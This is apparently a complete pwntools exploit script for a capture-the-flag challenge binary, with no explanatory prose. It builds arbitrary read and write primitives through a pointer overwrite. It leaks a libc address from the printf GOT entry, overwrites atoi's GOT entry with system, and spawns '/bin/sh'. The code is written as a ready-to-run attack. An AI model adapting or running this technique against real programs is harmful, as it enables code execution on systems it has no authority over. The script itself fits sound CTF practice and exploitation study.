from pwn import *

p = process('./chall_patched')
e = ELF("./chall_patched")
libc = ELF("./libc.so.6")

context.binary = e
# context.log_level = 'debug'

def create(idx):
    p.sendlineafter(b'Choice: ', b'1')
    p.sendlineafter(b'index: ', str(idx).encode())
    
def edit(data):
    p.sendlineafter(b'Choice: ', b'2')
    p.sendlineafter(b'data: ',data)
    
def test():
    p.sendlineafter(b'Choice: ', b'3')
    p.recvuntil(b"data: ")
    return p.recvline()

def explore(idx):
    p.sendlineafter(b'Choice: ', b'4')
    p.sendlineafter(b'index: ', str(idx).encode())
    
def reset():
    p.sendlineafter(b'Choice: ', b'5')
    
def arb_read(addr):
    create(0)
    create(1)
    explore(0)
    
    edit(b'A'*0x38 + p64(addr - 0x40))
    reset()
    
    explore(1)
    explore(1)
    res = test()
    reset()
    return res

def arb_write(addr, data):
    create(0)
    create(1)
    explore(0)
    
    edit(b'A'*0x38 + p64(addr-0x40))
    reset()
    
    explore(1)
    explore(1)
    edit(data)
    reset()
    
p.recvuntil(b'gift: ')
e.address=int(p.recvline()[:-1], 16) - e.sym.main
print(hex(e.address))

# print(arb_read(e.got.printf))
#libc.address=u64(arb_read(e.got.printf))-libc.sym.printf
libc.address = u64(arb_read(e.got.printf)[:8]) - libc.sym.printf

print(hex(libc.address))

arb_write(e.got.atoi, p64(libc.sym.system))

p.sendlineafter(b'Choice: ',b"/bin/sh")

p.interactive()